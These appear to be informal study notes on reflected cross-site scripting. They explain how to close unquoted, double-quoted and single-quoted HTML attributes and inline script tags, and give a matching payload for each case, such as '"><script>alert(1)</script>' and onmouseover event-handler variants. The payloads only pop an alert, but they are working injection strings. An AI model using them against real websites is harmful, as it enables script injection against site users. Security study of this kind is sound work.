Important thing to remmber:
"Browser executing HTML we know that and javascript can work with HTML."

"Always check source code of page before putting any payload in any input field."

"If we are facing situation like this [<a href="params.php?p=valid&pp=Hello">]' always check the ending of the function and start your payload with ending qutation in this situation our function is ending with double quote tag so our payload is start with double quote tag like this.. "><script>alert(1)</script>

"We know that JS can work with HTML. If we have function like this:
<input type="text" name="name" value=Hannan></input>

<input type="text" name="name" value=<script>alert(1)</script>></input>

<input type="text" name="name" value=>Hannan></input>

payload = ><script>alert(1)</script> "

"If our fucntion is closing with double quote like this:

<input type="text" name="name" value="Hannan"></input>

payload = "><script>alert(1)</script> "

"If our function is closing wuth single quote liek this:

<input type="text" name="name" value='Hannan'></input>

payload = '><script>alert(1)</script>

"If our fucntion is in script tag like this:

<center><script>var search_str="Hannan";</script>

Then, we use this payload: payload : </script><script>alert(1)</script> we can also apply this '; before payload."

"Sometimes keyboard input will become a string responce you can try to give input through mouse like this:

<input type="text" name="name" value='Hannan'></input>

onmouseover=alert(1);

'onmouseover='alert(1);

If our input correctly placed outside of any HTML tag then JS will
execute there:

"onmouseover="alert(1); "
